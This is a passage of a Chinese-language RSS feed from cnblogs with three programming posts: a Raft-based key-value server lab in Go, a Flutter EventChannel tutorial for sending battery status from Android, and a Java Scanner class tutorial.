-&lt;p&gt;如上图，lab2实现了raft协议，本lab将实现kvserver。每个raft都关联一个kvserver，Clerks发送Put(), Append(), Get() RPC给leader服务器中的kvserver，kvserver收到请求后将操作打包成Log Entry提交给raft，然后阻塞等待raft将这个Entry拷贝到其它server，当Log Entry被拷贝到大部分的server后，leader 的raft会通知kvserver（raft往管道中塞comitted Entry，kvserver通过读这个管道获取通知），kvserver执行命令，然后响应Clerk。&lt;/p&gt;
-&lt;h2 id=&quot;clerk&quot;&gt;Clerk&lt;/h2&gt;
-&lt;p&gt;客户端通过Clerk发送请求，来看下Clerk代码：&lt;/p&gt;
-&lt;pre class=&quot;go&quot;&gt;
-&lt;code&gt;type Clerk struct {
-    servers []*labrpc.ClientEnd
-    // You will have to modify this struct.
-
-    lastLeader  int
-    cid         int64
-    seq         int
-}
-
-func (ck *Clerk) Get(key string) string {
-
-    // You will have to modify this function.
-    // 参数: 要读的key, 当前clerk的id，  请求序列号
-    getArgs := GetArgs{Key: key, Cid:ck.cid, Seq:ck.seq}
-    reply := GetReply{}
-
-    for {
-        doneCh := make(chan bool, 1)
-        go func() {
-           //发送Get() RPC
-            ok := ck.servers[ck.lastLeader].Call(&quot;KVServer.Get&quot;, &amp;amp;getArgs, &amp;amp;reply)
-            doneCh &amp;lt;- ok
-        }()
-
-        select {
-        case &amp;lt;-time.After(600 * time.Millisecond):
-            DPrintf(&quot;clerk(%d) retry PutAppend after timeout\n&quot;, ck.cid)
-            continue
-        case ok := &amp;lt;- doneCh:
-           //收到响应后，并且是leader返回的，那么说明这个命令已经执行了
-            if ok &amp;amp;&amp;amp; reply.WrongLeader != WrongLeader {
-                //请求序列号加1
-              ck.seq++
-                return reply.Value
-            }
-        }
-
-       //换一个server重试
-        ck.lastLeader++
-        ck.lastLeader %= len(ck.servers)
-    }
-
-    return &quot;&quot;
-}&lt;/code&gt;
-&lt;/pre&gt;
-&lt;p&gt;这里只给出了Get()的代码，Put()和Append()类似，发送KVServer.Get给一个server，如果这个server不是leader，换一个server重试。直到发给真正的leader，并且leader将这个命令拷贝到大部分其它server后，然后成功执行该命令，Clerk.Get()才会返回。&lt;/p&gt;
-&lt;h2 id=&quot;kvserver&quot;&gt;KVServer&lt;/h2&gt;
-&lt;p&gt;再来看下服务端的代码，KVServer处理Clerk的RPC请求：&lt;/p&gt;
-&lt;pre class=&quot;go&quot;&gt;
-&lt;code&gt;type KVServer struct {
-    mu      sync.Mutex
-    me      int
-    rf      *raft.Raft
-    applyCh chan raft.ApplyMsg
-
-    maxraftstate int // snapshot if log grows this big
-
-    // Your definitions here.
-   // 保存键值对
-    db      map[string]string
-    latestReplies map[int64]*LatestReply
-    notify map[int]chan struct{}
-}
-
-func (kv *KVServer) Get(args *GetArgs, reply *GetReply) {
-    // Your code here.
-    if _, isLeader := kv.rf.GetState(); !isLeader {
-        reply.WrongLeader = WrongLeader
-        reply.Err = &quot;&quot;
-        return
-    }
-
-    // 防止重复请求
-    kv.mu.Lock()
-    if latestReply, ok := kv.latestReplies[args.Cid]; ok &amp;amp;&amp;amp; args.Seq &amp;lt;= latestReply.Seq {
-        reply.WrongLeader = IsLeader
-        reply.Value = latestReply.Reply.Value
-        reply.Err = latestReply.Reply.Err
-        kv.mu.Unlock()
-        return
-    }
-    kv.mu.Unlock()
-
-    command := Op{Operation:&quot;Get&quot;, Key:args.Key, Cid:args.Cid, Seq:args.Seq}
-    index, term, _ := kv.rf.Start(command)
-
-    // 阻塞等待结果
-    kv.mu.Lock()
-    ch := make(chan struct{})
-    kv.notify[index] = ch
-    kv.mu.Unlock()
-
-    select {
-    case &amp;lt;-ch:
-        curTerm, isLeader := kv.rf.GetState()
-        DPrintf(&quot;%v got notify at index %v, isLeader = %v\n&quot;, kv.me, index, isLeader)
-        if !isLeader || curTerm != term {
-            reply.WrongLeader = WrongLeader
-            reply.Err = &quot;&quot;
-        } else {
-            reply.WrongLeader = IsLeader
-            kv.mu.Lock()
-            if value, ok := kv.db[args.Key]; ok {
-                reply.Value = value
-                reply.Err = OK
-            } else {
-                reply.Err = ErrNoKey
-            }
-            kv.mu.Unlock()
-        }
-
-    }
-
-}&lt;/code&gt;
-&lt;/pre&gt;
-&lt;p&gt;KVServer.db用于保存键值对。&lt;br/&gt;KVServer.Get()首先判断自己是不是leader，如果不是leader，直接返回，这样Clerk好重试其它server。如果是leader，先在缓存中找，看这个请求是否已经执行过了。&lt;br/&gt;因为可能出现这么一种情况：如果leader commit一个Entry后立即奔溃了，那么Clerk就收不到响应，那么Clerk会将这个请求发给新的leader，新的leader收到请求后如果不做任何措施，将会二次commit该Log Entry，对于Put()和Append()请求执行两次是不正确的，所以需要一个办法防止一个请求执行两次。&lt;br/&gt;可以这么做：每个Clerk都分配一个唯一的cid，每个请求分配一个唯一的序列号seq，每成功一个请求，该序列号加一。服务端记录每个客户端cid最近一次apply的请求的序列号seq和对应的响应结果，根据这个信息可知，当再次收到这个客户端的序列号小于seq的请求时，说明已经执行过了，直接返回结果。&lt;/p&gt;
-&lt;p&gt;如果之前没有执行过，那么调用&lt;/p&gt;
-&lt;pre class=&quot;go&quot;&gt;
-&lt;code&gt;kv.rf.Start(command)&lt;/code&gt;
-&lt;/pre&gt;
-&lt;p&gt;将Log Entry提交给raft，并且阻塞等待raft将这个Entry拷贝到其它大部分server，从阻塞返回后，说明这个Entry已经被拷贝到大部分server了，并且已经执行了命令，这时可以将结果返回给Clerk了。&lt;/p&gt;
-&lt;p&gt;那么在哪里接收raft的消息呢？KVServer在创建的时候会在一个线程中执行如下函数：&lt;/p&gt;
-&lt;pre class=&quot;go&quot;&gt;
-&lt;code&gt;func (kv *KVServer) applyDaemon()  {
-    for appliedEntry := range kv.applyCh {
-        command := appliedEntry.Command.(Op)
-
-        // 执行命令, 过滤已经执行过得命令
-        kv.mu.Lock()
-        if latestReply, ok := kv.latestReplies[command.Cid]; !ok || command.Seq &amp;gt; latestReply.Seq {
-            switch command.Operation {
-            case &quot;Get&quot;:
-                latestReply := LatestReply{Seq:command.Seq,}
-                reply := GetReply{}
-                if value, ok := kv.db[command.Key]; ok {
-                    reply.Value = value
-                } else {
-                    reply.Err = ErrNoKey
-                }
-                latestReply.Reply = reply
-                kv.latestReplies[command.Cid] = &amp;amp;latestReply
-            case &quot;Put&quot;:
-                kv.db[command.Key] = command.Value
-                latestReply := LatestReply{Seq:command.Seq}
-                kv.latestReplies[command.Cid] = &amp;amp;latestReply
-            case &quot;Append&quot;:
-                kv.db[command.Key] += command.Value
-                latestReply := LatestReply{Seq:command.Seq}
-                kv.latestReplies[command.Cid] = &amp;amp;latestReply
-            default:
-                panic(&quot;invalid command operation&quot;)
-            }
-        }
-
-        DPrintf(&quot;%d applied index:%d, cmd:%v\n&quot;, kv.me, appliedEntry.CommandIndex, command)
-
-        // 通知
-        if ch, ok := kv.notify[appliedEntry.CommandIndex]; ok &amp;amp;&amp;amp; ch != nil {
-            DPrintf(&quot;%d notify index %d\n&quot;,kv.me, appliedEntry.CommandIndex)
-            close(ch)
-            delete(kv.notify, appliedEntry.CommandIndex)
-        }
-        kv.mu.Unlock()
-    }
-}&lt;/code&gt;
-&lt;/pre&gt;
-&lt;p&gt;kv.applyCh这个chanel会在创建raft的时候传给raft，当某个Log Entry可以被commit的时候，raft会往这个chanel中塞，只要for循环这个kv.applyCh，就能知道已经被commit的Entry，拿到Entry后，根据其中的命令执行相应的操作，然后通知KVServer.Get()继续执行。&lt;/p&gt;
-&lt;p&gt;具体代码在：&lt;a href=&quot;https://github.com/gatsbyd/mit_6.824_2018&quot; class=&quot;uri&quot;&gt;https://github.com/gatsbyd/mit_6.824_2018&lt;/a&gt;&lt;br/&gt;如有错误，欢迎指正：&lt;br/&gt;15313676365&lt;/p&gt;
-</description>
-<pubDate>Fri, 22 Mar 2019 12:22:00 +0000</pubDate>
-<dc:creator>gatsby123</dc:creator>
-<og:description>概述 lab2中实现了raft协议，本lab将在raft之上实现一个可容错的k/v存储服务，第一部分是实现一个不带日志压缩的版本，第二部分是实现日志压缩。时间原因我只完成了第一部分。 设计思路 ![k</og:description>
-<dc:language>zh-cn</dc:language>
-<dc:format>text/html</dc:format>
-<dc:identifier>http://www.cnblogs.com/gatsby123/p/10580757.html</dc:identifier>
-</item>
-<item>
-<title>Flutter 即学即用系列博客——09 EventChannel 实现原生与 Flutter 通信（一） - AndroidTraveler</title>
-<link>http://www.cnblogs.com/nesger/p/10580750.html</link>
-<guid isPermaLink="true" >http://www.cnblogs.com/nesger/p/10580750.html</guid>
-<description>&lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/5361063-c6f10fe2de96dc72.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/800&quot;/&gt;&lt;/p&gt;
-&lt;h4 id=&quot;前言&quot;&gt;前言&lt;/h4&gt;
-&lt;p&gt;紧接着上一篇，这一篇我们讲一下原生怎么给 Flutter 发信号，即原生-&amp;gt; Flutter&lt;/p&gt;
-&lt;p&gt;还是通过 Flutter 官网的 Example 来讲解。&lt;/p&gt;
-&lt;h4 id=&quot;案例&quot;&gt;案例&lt;/h4&gt;
-&lt;p&gt;接着上一次，这一次我们让原生主动将电池的充电状态发送给 Flutter 并在界面显示。&lt;/p&gt;
-&lt;p&gt;步骤如下。&lt;/p&gt;
-&lt;h5 id=&quot;flutter-界面修改&quot;&gt;1. Flutter 界面修改&lt;/h5&gt;
-&lt;p&gt;我们在原先基础上增加一列用于显示文本。&lt;/p&gt;
-&lt;pre&gt;
-&lt;code&gt;String _chargingStatus = 'Battery status: unknown.';
-Text(_chargingStatus),&lt;/code&gt;
-&lt;/pre&gt;
-&lt;h5 id=&quot;flutter-定义-eventchannel&quot;&gt;2. Flutter 定义 EventChannel&lt;/h5&gt;
-&lt;p&gt;我们在 _BatteryWidgetState 里面加入下面变量：&lt;/p&gt;
-&lt;pre&gt;
-&lt;code&gt;static const EventChannel eventChannel = EventChannel('samples.flutter.io/charging');&lt;/code&gt;
-&lt;/pre&gt;
-&lt;p&gt;samples.flutter.io/charging 可以自己指定，一般保证唯一，所以 samples 实际使用可以替换为包名。主要是要跟原生对应即可。&lt;/p&gt;
-&lt;h5 id=&quot;flutter-在-initstate-实现-eventchannel-监听并实现对应回调方法&quot;&gt;3. Flutter 在 initState 实现 EventChannel 监听并实现对应回调方法&lt;/h5&gt;
-&lt;pre&gt;
-&lt;code&gt;  @override
-  void initState() {
-    super.initState();
-    eventChannel.receiveBroadcastStream().listen(_onEvent, onError: _onError);
-  }
-
-  void _onEvent(Object event) {
-    setState(() {
-      _chargingStatus =
-      &quot;Battery status: ${event == 'charging' ? '' : 'dis'}charging.&quot;;
-    });
-  }
-
-  void _onError(Object error) {
-    setState(() {
-        PlatformException exception = error;
-        _chargingStatus = exception?.message ?? 'Battery status: unknown.';
-    });
-  }&lt;/code&gt;
-&lt;/pre&gt;
-&lt;p&gt;可以看到如果原生发送 charging 显示 charging，否则显示 discharging。&lt;/p&gt;
-&lt;p&gt;当然错误显示的是原生发送过来的错误信息。&lt;/p&gt;
-&lt;p&gt;注意这里如果要获取到错误信息，需要通过&lt;/p&gt;
-&lt;pre&gt;
-&lt;code&gt;PlatformException exception = error;&lt;/code&gt;
-&lt;/pre&gt;
-&lt;p&gt;这个转换语句才可以。&lt;/p&gt;
-&lt;h5 id=&quot;原生定义-eventchannel&quot;&gt;4. 原生定义 EventChannel&lt;/h5&gt;
-&lt;pre&gt;
-&lt;code&gt;private static final String CHARGING_CHANNEL = &quot;samples.flutter.io/charging&quot;;&lt;/code&gt;
-&lt;/pre&gt;
-&lt;p&gt;注意需要跟 Flutter 的一一对应。&lt;/p&gt;
-&lt;h5 id=&quot;原生创建-eventchannel-并通过-streamhandler-的-eventsink-发送内容给-flutter&quot;&gt;5. 原生创建 EventChannel 并通过 StreamHandler 的 EventSink 发送内容给 Flutter&lt;/h5&gt;
-&lt;pre&gt;
-&lt;code&gt;new EventChannel((FlutterView) flutterView, CHARGING_CHANNEL).setStreamHandler(
-        new EventChannel.StreamHandler() {
-
-            @Override
-            public void onListen(Object arguments, EventChannel.EventSink events) {
-            }
-
-            @Override
-            public void onCancel(Object arguments) {
-            }
-        }
-);&lt;/code&gt;
-&lt;/pre&gt;
-&lt;p&gt;具体到这里为：&lt;/p&gt;
-&lt;pre&gt;
-&lt;code&gt;new EventChannel((FlutterView)flutterView, CHARGING_CHANNEL).setStreamHandler(
-        new EventChannel.StreamHandler() {
-            private BroadcastReceiver chargingStateChangeReceiver;
-            @Override
-            public void onListen(Object arguments, EventChannel.EventSink events) {
-                chargingStateChangeReceiver = createChargingStateChangeReceiver(events);
-                registerReceiver(
-                        chargingStateChangeReceiver, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
-            }
-
-            @Override
-            public void onCancel(Object arguments) {
-                unregisterReceiver(chargingStateChangeReceiver);
-                chargingStateChangeReceiver = null;
-            }
-        }
-);
-
-private BroadcastReceiver createChargingStateChangeReceiver(final EventChannel.EventSink events) {
-    return new BroadcastReceiver() {
-        @Override
-        public void onReceive(Context context, Intent intent) {
-            int status = intent.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
-
-            if (status == BatteryManager.BATTERY_STATUS_UNKNOWN) {
-                events.error(&quot;UNAVAILABLE&quot;, &quot;Charging status unavailable&quot;, null);
-            } else {
-                boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
-                        status == BatteryManager.BATTERY_STATUS_FULL;
-                events.success(isCharging ? &quot;charging&quot; : &quot;discharging&quot;);
-            }
-        }
-    };
-}&lt;/code&gt;
-&lt;/pre&gt;
-&lt;p&gt;这里的 &lt;strong&gt;events.success&lt;/strong&gt; 和 &lt;strong&gt;events.error&lt;/strong&gt; 分别会调用 Flutter 的对应方法。&lt;/p&gt;
-&lt;p&gt;其中 error 的参数对应 Flutter 的 PlatformException 的参数。&lt;/p&gt;
-&lt;pre&gt;
-&lt;code&gt;PlatformException({
-  @required this.code,
-  this.message,
-  this.details,
-}) : assert(code != null);&lt;/code&gt;
-&lt;/pre&gt;
-&lt;p&gt;这里通过广播的方式将电量状态变化发送给 Flutter。&lt;/p&gt;
-&lt;p&gt;效果如下：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/5361063-cf17f16210874320.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot;/&gt;&lt;/p&gt;
-&lt;h4 id=&quot;扩展&quot;&gt;扩展&lt;/h4&gt;
-&lt;p&gt;其实我们点击 Flutter 的 EventChannel，会看到源码里面的 receiveBroadcastStream 方法是对 MethodChannel 做了封装。&lt;/p&gt;
-&lt;pre&gt;
-&lt;code&gt;Stream&amp;lt;dynamic&amp;gt; receiveBroadcastStream([dynamic arguments]) {
-    final MethodChannel methodChannel = MethodChannel(name, codec);
-    StreamController&amp;lt;dynamic&amp;gt; controller;
-    controller = StreamController&amp;lt;dynamic&amp;gt;.broadcast(onListen: () async {
-      BinaryMessages.setMessageHandler(name, (ByteData reply) async {
-        if (reply == null) {
-          controller.close();
-        } else {
-          try {
-            controller.add(codec.decodeEnvelope(reply));
-          } on PlatformException catch (e) {
-            controller.addError(e);
-          }
-        }
-        return null;
-      });
-      try {
-        await methodChannel.invokeMethod('listen', arguments);
-      } catch (exception, stack) {
-        FlutterError.reportError(FlutterErrorDetails(
-          exception: exception,
-          stack: stack,
-          library: 'services library',
-          context: 'while activating platform stream on channel $name',
-        ));
-      }
-    }, onCancel: () async {
-      BinaryMessages.setMessageHandler(name, null);
-      try {
-        await methodChannel.invokeMethod('cancel', arguments);
-      } catch (exception, stack) {
-        FlutterError.reportError(FlutterErrorDetails(
-          exception: exception,
-          stack: stack,
-          library: 'services library',
-          context: 'while de-activating platform stream on channel $name',
-        ));
-      }
-    });
-    return controller.stream;
-  }&lt;/code&gt;
-&lt;/pre&gt;
-&lt;p&gt;所以其实原生-&amp;gt; Flutter 的通信也是可以用 MethodChannel 直接实现。&lt;/p&gt;
-&lt;p&gt;那怎么实现呢？&lt;/p&gt;
-&lt;blockquote readability=&quot;5&quot;&gt;
-&lt;p&gt;欲知详情，且听下回讲解&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/5361063-4e661dcb8cd24bc7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;本文源码位置：&lt;/strong&gt;&lt;br/&gt;https://github.com/nesger/FlutterSample/tree/feature/event_channel&lt;/p&gt;
-&lt;h5 id=&quot;参考链接&quot;&gt;参考链接：&lt;/h5&gt;
-&lt;p&gt;https://flutter.dev/docs/development/platform-integration/platform-channels&lt;br/&gt;https://github.com/flutter/flutter/tree/master/examples/platform_channel&lt;/p&gt;
-&lt;p&gt;更多阅读：&lt;br/&gt;&lt;strong&gt;Flutter 即学即用系列博客&lt;/strong&gt;&lt;br/&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/mEwJE5mXwpmuWgVNL9O42g&quot;&gt;Flutter 即学即用系列博客——01 环境搭建&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/LAmQYsjZmn56HZWrSZ59vQ&quot;&gt;Flutter 即学即用系列博客——02 一个纯 Flutter Demo 说明&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/OGbH3G3wHVTUt-0EJit8RA&quot;&gt;Flutter 即学即用系列博客——03 在旧有项目引入 Flutter&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/8s2ye_bvkUDn8yrEEDS1dQ&quot;&gt;Flutter 即学即用系列博客——04 Flutter UI 初窥&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/TiJgFsZkHaNWSnvGfUraTQ&quot;&gt;Flutter 即学即用系列博客——05 StatelessWidget vs StatefulWidget&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/bWAefJgqFQu5xRWvsCXLBQ&quot;&gt;Flutter 即学即用系列博客——06 超实用 Widget 集锦&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/CfXR3nshGD8LwG0FgaemVw&quot;&gt;Flutter 即学即用系列博客——07 RenderFlex overflowed 引发的思考&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/aPFO_IsRED8flVxWRdchKw&quot;&gt;Flutter 即学即用系列博客——08 MethodChannel 实现 Flutter 与原生通信&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Flutter &amp;amp; dart&lt;/strong&gt;&lt;br/&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/7-F_p8SPTZpKKKzE1Hc8YQ&quot;&gt;dart 如何优雅的避空&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/i6lUDj_WTZu1CFtdICdaIw&quot;&gt;Flutter map 妙用及 .. 使用&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/5361063-7bf91fa856fa8f75.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot;/&gt;&lt;/p&gt;
-</description>
-<pubDate>Fri, 22 Mar 2019 12:19:00 +0000</pubDate>
-<dc:creator>AndroidTraveler</dc:creator>
-<og:description>前言 紧接着上一篇，这一篇我们讲一下原生怎么给 Flutter 发信号，即原生 Flutter 还是通过 Flutter 官网的 Example 来讲解。 案例 接着上一次，这一次我们让原生主动将电池</og:description>
-<dc:language>zh-cn</dc:language>
-<dc:format>text/html</dc:format>
-<dc:identifier>http://www.cnblogs.com/nesger/p/10580750.html</dc:identifier>
-</item>
-<item>
-<title>Scanner类详解 - 冰湖一角</title>
-<link>http://www.cnblogs.com/bingyimeiling/p/10580447.html</link>
-<guid isPermaLink="true" >http://www.cnblogs.com/bingyimeiling/p/10580447.html</guid>
-<description>&lt;p&gt;Scanner类用于获取键盘输入（是一个基于正则表达式的文本扫描器），它可以从文件、字符串、输入流中解析出基本类型值和字符串值。Scanner类提供了多个构造器，不同的构造器可以接收文件、字符串和输入流作为数据源，用于从文件、字符串和输入流中解析数据。&lt;/p&gt;
-&lt;p&gt;Scanner类主要提供了两个方法来扫描输入：&lt;br/&gt;1）hasNextXx()：是否还有下一个输入项，其中Xxx可以是Int、Long等代表基本数据类型的字符串。如果只是判断是否包含下一个字符串，则直接使用hasNext()。&lt;/p&gt;
-&lt;p&gt;2）nextXxx()：获取下一个输入项。Xxx的含义同上。&lt;/p&gt;
-&lt;p&gt;默认情况下，Scanner使用空白（包括空格、Tab空白和回车）作为多个输入项的分隔符。&lt;/p&gt;
-&lt;p&gt;下面程序使用Scanner来获得用户的键盘输入：&lt;/p&gt;
-
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Test{
-    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; main(String[] args){
-        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;System.in代表键盘输入&lt;/span&gt;
-        Scanner sc = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Scanner(System.in);
-        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;下面这行代码是把回车作为分隔符&lt;/span&gt;
-        sc.useDelimiter(&quot;\n&quot;&lt;span&gt;);
-　　　　&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;判断是否还有下一个输入项&lt;/span&gt;
-        &lt;span&gt;while&lt;/span&gt;&lt;span&gt;(sc.hasNext()){
-            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;输出输入项&lt;/span&gt;
-            System.out.println(&quot;键盘输入的内容是：&quot;+&lt;span&gt;sc.next());    
-        }
-    }
-}&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt; 运行上面的程序，程序会通过Scanner不断的从键盘读取键盘输入，然后打印到控制台，程序运行效果如下：&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;java
-键盘输入的内容是：java
-c&lt;/span&gt;++&lt;span&gt;
-键盘输入的内容是：c&lt;/span&gt;++&lt;span&gt;
-html
-键盘输入的内容是：html&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;为Scanner设置分隔符使用 useDelimiter(String pattern)方法即可，该方法的参数是一个正则表达式（后面发布内容会介绍到），如果把上面程序这一行sc.useDelimiter(&quot;\n&quot;)注释掉，该程序就会把键盘的每行输入当成一个输入项，不会以空格、Tab空白或回车等作为分隔符。&lt;/p&gt;
-&lt;p&gt;其实，Scanner提供了两个简单的逐行读取的方法：&lt;/p&gt;
-&lt;p&gt;1）boolean hasNextLine()：返回输入源中是否还有下一行。&lt;/p&gt;
-&lt;p&gt;2）String nextLine()：返回输入源中下一行的字符串。&lt;/p&gt;
-&lt;p&gt;Scanner除了可以获取字符串输入项之外，还可以获取任意基本类型的输入项，如下程序：&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Test{
-    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; main(String[] args){
-        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;System.in代表键盘输入&lt;/span&gt;
-        Scanner sc = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Scanner(System.in);
-        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;判断是否还有下一个long型整数&lt;/span&gt;
-        &lt;span&gt;while&lt;/span&gt;&lt;span&gt;(sc.hasNextLong()){
-            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;输出输入项&lt;/span&gt;
-            System.out.println(&quot;键盘输入的内容是：&quot;+&lt;span&gt;sc.nextLong());    
-       }
-    }
-}&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;上面程序通过hasNextLong()和nextLong()两个方法可以直接获取输入的Long型整数，如果需要获取其它基本类型的输入项，则可以用相同的方法。&lt;/p&gt;
-&lt;p&gt;Scanner除了能读取键盘输入外，还可以读取文件输入。只要在创建Scanner对象时传入一个File对象作为参数即可，例如下面的示例：&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Test{
-    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; main(String[] args) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Exception{
-        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;Scanner读取文件内容：将一个File对象作为Scanner的构造器参数&lt;/span&gt;
-        Scanner sc = &lt;span&gt;new&lt;/span&gt; Scanner(&lt;span&gt;new&lt;/span&gt; File(&quot;Test.java&quot;&lt;span&gt;));
-    　　System.out.println(&lt;/span&gt;&quot;Test.java文件内容如下：&quot;&lt;span&gt;);
-    　　&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;判断是否还有下一行&lt;/span&gt;
-    　　&lt;span&gt;while&lt;/span&gt;&lt;span&gt;(sc.hasNextLine()){
-       　　&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;输出文件的下一行&lt;/span&gt;
-&lt;span&gt;          System.out.println(sc.nextLine());    
-    　　}
-    }
-}&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;上面程序因为涉及IO读取，可能引发IO异常，所以程序声明throws Exception表明main方法不处理任何异常。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;欢迎关注微信公众号【Java典籍】，收看更多Java技术干货！&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;　 &lt;/strong&gt;▼微信扫一扫下图↓↓↓二维码关注&lt;/p&gt;
-&lt;p&gt;　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1362965/201901/1362965-20190109201610986-215386546.jpg&quot; alt=&quot;&quot; width=&quot;164&quot; height=&quot;164&quot;/&gt;&lt;/p&gt;
-</description>
-<pubDate>Fri, 22 Mar 2019 12:14:00 +0000</pubDate>
-<dc:creator>冰湖一角</dc:creator>
-<og:description>Scanner类用于获取键盘输入（是一个基于正则表达式的文本扫描器），它可以从文件、字符串、输入流中解析出基本类型值和字符串值。Scanner类提供了多个构造器，不同的构造器可以接收文件、字符串和输入</og:description>
-<dc:language>zh-cn</dc:language>
-<dc:format>text/html</dc:format>
-<dc:identifier>http://www.cnblogs.com/bingyimeiling/p/10580447.html</dc:identifier>
 </item>
 </channel>
 </rss>
